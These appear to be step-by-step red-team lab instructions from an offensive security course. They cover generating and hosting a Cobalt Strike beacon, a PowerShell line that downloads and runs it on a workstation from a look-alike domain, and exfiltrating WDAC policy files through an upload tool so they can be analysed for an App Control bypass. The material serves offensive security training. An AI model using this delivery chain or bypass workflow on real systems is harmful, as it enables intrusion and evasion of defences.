
# Generate and host payload

1. Launch Cobalt Strike and connect to the Team Server.
    
2. Generate a payload.
    
    1. **Payloads > Windows Stageless Payload**
    2. Listener: http
    3. Click **Generate**
    4. Save to _C:\Payloads\beacon_x64.exe_
3. Host the payload.
    
    1. **Site Management > Host File**
    2. File: C:\Payloads\beacon_x64.exe
    3. Local URI: /beacon_x64.exe
    4. Click **Launch**
4. Switch to [Workstation 2](https://labclient.labondemand.com/Instructions/5ebd7e42-e84a-4271-8539-fa53e309479b#) and login with Passw0rd!.
    
5. Download and execute the payload.
    
    powershellTypeCopy
    
    ```
    iwr -Uri "http://www.bleepincomputer.com/beacon_x64.exe" -OutFile "C:\Users\rsteel\Downloads\beacon_x64.exe" Start-Process -FilePath "C:\Users\rsteel\Downloads\beacon_x64.exe"
    ```


# Analyze policy files

1. Switch to the [Attacker Desktop](https://labclient.labondemand.com/Instructions/5ebd7e42-e84a-4271-8539-fa53e309479b#).
    
2. Open Terminal and SSH into the Team Server VM.
    
    1. ssh attacker@10.0.0.5
    2. The password is Passw0rd!.
3. Run pwnlift on port 8080.
    
    1. cd pwnlift
    2. ./pwnlift --urls http://*:8080
4. Return to [Workstation 2](https://labclient.labondemand.com/Instructions/5ebd7e42-e84a-4271-8539-fa53e309479b#).
    
5. Open Edge and navigate to http://www.bleepincomputer.com:8080
    
6. Click **Open File Picker**.
    
7. Navigate to _C:\Windows\System32\CodeIntegrity\CIPolicies\Active_.
    
8. Select each file with the **.CIP** (upper-case) file extension.
    
9. Click **Upload**.
    
10. Switch back to the [Attacker Desktop](https://labclient.labondemand.com/Instructions/5ebd7e42-e84a-4271-8539-fa53e309479b#).
    
11. Open another Terminal window and transfer the files to the local desktop.
    
    1. scp -r attacker@10.0.0.5:/home/attacker/pwnlift/Uploads C:\Users\Attacker\Desktop
12. Import WDACTools.
    
    1. cd .\Desktop\Uploads
    2. ipmo C:\Tools\WDACTools\WDACTools.psd1
13. Convert the policies to XML.
    
```
1. ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath '.\{69bbe64a-1b54-4067-b5d3-9b3e2a9f553e}.cip' -XmlFilePath '.\{69bbe64a-1b54-4067-b5d3-9b3e2a9f553e}.xml' ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath '.\{8678331a-1abe-4ad0-b84c-36bf5e023614}.cip' -XmlFilePath '.\{8678331a-1abe-4ad0-b84c-36bf5e023614}.xml' ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath '.\{c3c533e1-8d36-41e5-bd04-7e096bce1c8d}.cip' -XmlFilePath '.\{c3c533e1-8d36-41e5-bd04-7e096bce1c8d}.xml' ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.cip' -XmlFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.xml'
```
    
2. Open the files in VSCode.
    
    1. code .

> Analyze the policy files and figure out a way to bypass App Control. Review the [course page](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops-ii&unit=68adb979a1da70c6320b3297Unit) if you need to.